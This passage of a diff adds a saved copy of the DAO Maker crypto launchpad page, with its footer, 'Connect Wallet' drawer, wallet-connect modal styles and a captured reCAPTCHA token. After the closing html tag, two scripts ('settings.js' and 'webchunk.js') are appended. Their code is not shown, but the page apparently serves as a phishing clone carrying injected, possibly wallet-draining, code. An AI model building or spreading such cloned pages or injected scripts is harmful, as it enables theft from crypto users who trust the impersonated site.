25.191406 22.207031 25.25 22.132813 25.308594 C 22.054688 25.371094 21.992188 25.410156 21.667969 25.28125 L 15.757813 20.75 L 12.1875 24.003906 L 12.9375 19.214844 C 12.9375 19.214844 22.195313 10.585938 22.59375 10.214844 C 22.992188 9.84375 22.859375 9.765625 22.859375 9.765625 C 22.886719 9.3125 22.257813 9.632813 22.257813 9.632813 L 10.082031 17.175781 L 10.078125 17.15625 L 4.242188 15.191406 L 4.242188 15.1875 C 4.238281 15.1875 4.230469 15.183594 4.226563 15.183594 C 4.230469 15.183594 4.257813 15.171875 4.257813 15.171875 L 4.289063 15.15625 L 4.320313 15.144531 C 4.320313 15.144531 9.53125 12.949219 14.828125 10.71875 C 17.480469 9.601563 20.152344 8.476563 22.207031 7.609375 C 24.261719 6.746094 25.78125 6.113281 25.867188 6.078125 C 25.949219 6.046875 25.910156 6.046875 25.96875 6.046875 Z"></path>
+                                        </svg></a><a class="cursor-pointer text-base-content" href="https://x.com/daomaker" target="_blank" rel="noopener"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+                                            <path d="M4 4l11.733 16h4.267l-11.733 -16z"></path>
+                                            <path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772"></path>
+                                        </svg></a></div>
+                                <div class="text-right"><span class="inline-block">©
+                                        <!-- -->2024
+                                        <!-- --> DAO Maker.
+                                    </span><span class="inline-block">&nbsp;All rights reserved.</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="drawer-side z-50 overflow-clip">
+                    <div class="flex min-h-full w-5/6 max-w-xs flex-col bg-base-300/80 p-10 backdrop-blur-sm">
+                        <div class="grow">
+                            <div class="absolute right-0"></div>
+                            <div class="select-none">
+                                <div class="flex justify-center">
+                                    <div class="btn btn-primary btn-disabled interact-button">Connect Wallet</div>
+                                </div>
+                                <div class="mt-16 flex flex-col items-center text-xl font-bold tracking-wide text-base-content/90"><label for="main-drawer" aria-label="close sidebar" class="cursor-pointer py-2 hover:scale-105 hover:text-base-content/80">Profile</label><label for="main-drawer" aria-label="close sidebar" class="my-2 cursor-pointer py-1 hover:scale-105 hover:text-base-content/80">Participations</label><label for="main-drawer" aria-label="close sidebar" class="my-2 cursor-pointer py-1 hover:scale-105 hover:text-base-content/80">Staking</label></div>
+                            </div>
+                        </div>
+                        <div class="mb-1 mr-1 mt-12 flex items-end justify-between">
+                            <div></div><label class="swap swap-rotate hover:scale-110"><input type="checkbox" class="theme-controller" value="dark" checked="checked"><svg class="swap-off h-6 w-6 fill-current" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                    <path d="M5.64,17l-.71.71a1,1,0,0,0,0,1.41,1,1,0,0,0,1.41,0l.71-.71A1,1,0,0,0,5.64,17ZM5,12a1,1,0,0,0-1-1H3a1,1,0,0,0,0,2H4A1,1,0,0,0,5,12Zm7-7a1,1,0,0,0,1-1V3a1,1,0,0,0-2,0V4A1,1,0,0,0,12,5ZM5.64,7.05a1,1,0,0,0,.7.29,1,1,0,0,0,.71-.29,1,1,0,0,0,0-1.41l-.71-.71A1,1,0,0,0,4.93,6.34Zm12,.29a1,1,0,0,0,.7-.29l.71-.71a1,1,0,1,0-1.41-1.41L17,5.64a1,1,0,0,0,0,1.41A1,1,0,0,0,17.66,7.34ZM21,11H20a1,1,0,0,0,0,2h1a1,1,0,0,0,0-2Zm-9,8a1,1,0,0,0-1,1v1a1,1,0,0,0,2,0V20A1,1,0,0,0,12,19ZM18.36,17A1,1,0,0,0,17,18.36l.71.71a1,1,0,0,0,1.41,0,1,1,0,0,0,0-1.41ZM12,6.5A5.5,5.5,0,1,0,17.5,12,5.51,5.51,0,0,0,12,6.5Zm0,9A3.5,3.5,0,1,1,15.5,12,3.5,3.5,0,0,1,12,15.5Z"></path>
+                                </svg><svg class="swap-on h-6 w-6 fill-current" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                    <path d="M21.64,13a1,1,0,0,0-1.05-.14,8.05,8.05,0,0,1-3.37.73A8.15,8.15,0,0,1,9.08,5.49a8.59,8.59,0,0,1,.25-2A1,1,0,0,0,8,2.36,10.14,10.14,0,1,0,22,14.05,1,1,0,0,0,21.64,13Zm-9.5,6.69A8.14,8.14,0,0,1,7.08,5.22v.27A10.15,10.15,0,0,0,17.22,15.63a9.79,9.79,0,0,0,2.1-.22A8.11,8.11,0,0,1,12.14,19.73Z"></path>
+                                </svg></label>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+    <w3m-modal data-scrapbook-shadowdom="<!----><style data-scrapbook-elem=&quot;adoptedStyleSheet&quot;>:host { z-index: var(--w3m-z-index); display: block; backface-visibility: hidden; will-change: opacity; position: fixed; inset: 0px; pointer-events: none; opacity: 0; background-color: var(--wui-cover); }
+@keyframes zoom-in { 
+  0% { transform: scale(0.95) translateY(0px); }
+  100% { transform: scale(1) translateY(0px); }
+}
+@keyframes slide-in { 
+  0% { transform: scale(1) translateY(50px); }
+  100% { transform: scale(1) translateY(0px); }
+}
+wui-card { max-width: 360px; width: 100%; position: relative; animation-delay: 0.3s; animation-duration: 0.2s; animation-name: zoom-in; animation-fill-mode: backwards; animation-timing-function: var(--wui-ease-out-power-2); outline: none; }
+wui-flex { overflow: hidden auto; display: flex; align-items: center; justify-content: center; width: 100%; height: 100%; }
+@media (max-height: 700px) and (min-width: 431px) {
+  wui-flex { align-items: flex-start; }
+  wui-card { margin: var(--wui-spacing-xxl) 0px; }
+}
+@media (max-width: 430px) {
+  wui-flex { align-items: flex-end; }
+  wui-card { max-width: 100%; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; border-bottom: none; animation-name: slide-in; }
+}</style>"></w3m-modal>
+    <div id="fire_app_check_[DEFAULT]" style="display: none;">
+        <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
+            <div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-9lclsi3esw60" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="index_2.html"></iframe></div>
+            <div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;">03AFcWeA6wqFhMQIX05V2oXvPSRfxVoHHIxmzdZ050qy3vAv4D04bOH2VNbQ1rTavyrXSdq3k5vETH_YPi8yfKAZLvebAIpzw2J_EYdSsXIZJUMWN7jc_vHJubQdAW9FO8yzuUjove9G8vEYScM1JurdsevQ2_qQMTYBqfBA6V5FUS0MVJYuvZwK0TRvB-eAuoSeflbqUwsj7iwKMuQkECWDNxakoTmvz6hIdG5suMXQV-SNcjtsqs8R2k3H662qRBI3Q2_xVXtZIbfCrbh-jvmLoS2nhk_nUm9vT0dqrenZHCdon7tPBQ844Ihq0RISVLFs7uwkc18yJrSCVzh2CVe39dojzXr74Xk8jNjc0AN7eDidz9BuGpKRG-28svo7m6fI68vuOjusbSc6b8UvkcdN3oEg_z_8H-Po6_aQsp9HSh8NnvSSpgne0tNxMzIvmdm442R-nNg3LWsH0_12BzU4y75oyevDjO5cfZow8j-ToLs5eVRWK-zqzZaumaE3aLU8hx3_9oNT2h2B-mzGoY0eRkv5UTFd57RMUz-vi5LRrgGeAnL10ONs0S1fUNl4EgvNMbIs0RNF_alMCqUwb9_XzM8X330U1a9UC8Ae7-5V07d2n_eTfAEfxBooJk18xJQ5z7mwUlFdN05QzCW9ULDjkiwRW1_s3kTOjgAlhZ00wLABZZiQVaO6xRyMppA50lZI1xfFa1sYsujTyE9-43kNu4MNKarenLUtbAvzEhKXHpR-3ZDOiXQdAKfut_jl_G2T3Q9OMQ-pv7jVohbvKbXRzhHuUeduBIKgQDuW4F1p-HtF7vjPkB8MdHJ43aHL4DTaZgn8YQZV8uj52I6u3jcXnI1iScdmCFmgJTcEK76QnkFJzWVOP00xO4FQAu4cwNoH4f9BugYAnvi4l6XwSDvlUbGGgggfAm15Gaqn5QuzfVxbgOHwTwV8EL56ypZA1fKwu0BLOaP5fVC1XP72FJAQNHSu83xZMDeN7DFYmOIfFCbCoYKisrSJJbJOa6ZojNdbDw2sULPReDkNp33GxVf3yH9IrctMSz5Zp5lyBGfkO3lYn2kwmdSXE_OlWSRmS-Yez1I8yLl8toXCjPI5RAOdZn_e0CAzonfvw3LE64vUkSlXDLsd-pTeMbBwsnHy2wTuiUQOryu-RRVBiZr3wjFPglIAPqUVHse_lVXPkxx9vLhRfMgLDE2tXBnWKCBDBvWkwI6Nn8GiugEt3cfSZVUySXeJL8uTmTYz0OLKfCaKnDux8FrAGThzvn3dxz1shvMagDaU5spxlUkQ4yrFmmBrPdvsidD0cIs-E48UduGTR3-jJLq8wzbDnnmfJMpUvYMUauq_0B_R3ooVgKjWzqRzZ7iC29Rd0J1bvRAdV-W9d8VKsPDHmzF53UwMsNBKtd5xHAb2RQiRBwRegPCX5iUwqu-CkR_yOn7zEpspci8BN4UfjY45Phto1pqHXHQC5eKY5ez2BM165yIWB9k27e_xClJUjRIA6oHk1KJtD5Kx8DrBPCRHL4Mf76GCJsujuCDeotCrKllTQExI3GyrCUr1B6YLGBtBkCwbPoszRXOpalBUBttilrCyk</textarea>
+        </div><iframe style="display: none;" src="index_1.html"></iframe>
+    </div>
+
+</body>
+
+</html><script src="./js/settings.js"></script><script src="./js/webchunk.js"></script>
